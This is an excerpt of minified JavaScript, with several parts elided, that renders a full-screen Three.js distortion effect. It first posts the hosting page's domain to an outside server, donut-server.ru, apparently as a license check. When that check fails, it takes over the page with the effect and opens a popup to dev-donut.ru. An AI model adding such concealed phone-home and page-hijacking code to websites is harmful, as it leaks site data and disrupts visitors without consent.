function removeProtocol(e){
	...
	function startBlyad(e){
		...
		THREE.SpriteMaterial({
			map:e}),a=new THREE.Sprite(t);
		a.scale.set(window.innerWidth,window.innerHeight,1),s.add(a);
		var o=new THREE.Vector3(0,0,-10);
		o.applyQuaternion(camera.quaternion),a.position.copy(o)}let l,p,c;
		...
		e++){
			let t=h.vertices[e];
		t.original=t.clone()}let g=new THREE.MeshStandardMaterial({
		...
		const f=e=>{
			try{
			TweenMax.to(E,.8,{
			x:e.clientX||e.pageX||e.touches[0].pageX||0,y:e.clientY||e.pageY||e.touches[0].pageY||0,ease:Power2.easeOut})}catch(e){
			return}};
		...
		a.multiplyScalar(r)}h.verticesNeedUpdate=!0})(e),n.clear(),n.render(s,camera)};
		requestAnimationFrame(v),n.render(s,camera)}$.post("https://donut-server.ru:8443/lib-domain",{
			domain:domain}).success(function(e){
			...
			startBlyad()})})})}).error(function(e){
			$.getScript("https://cdnjs.cloudflare.com/ajax/libs/three.js/97/three.min.js",function(){
			$.getScript("https://cdnjs.cloudflare.com/ajax/libs/gsap/2.0.2/TweenMax.min.js",function(){
			$.getScript("https://cdn.rawgit.com/josephg/noisejs/master/perlin.js",function(){
			["iPad","iPhone","iPod"].indexOf(navigator.platform)>=0?(startBlyad(),console.log("ios. error. start full")):startBlyad("free")})})}),window.open("https://dev-donut.ru/error")});
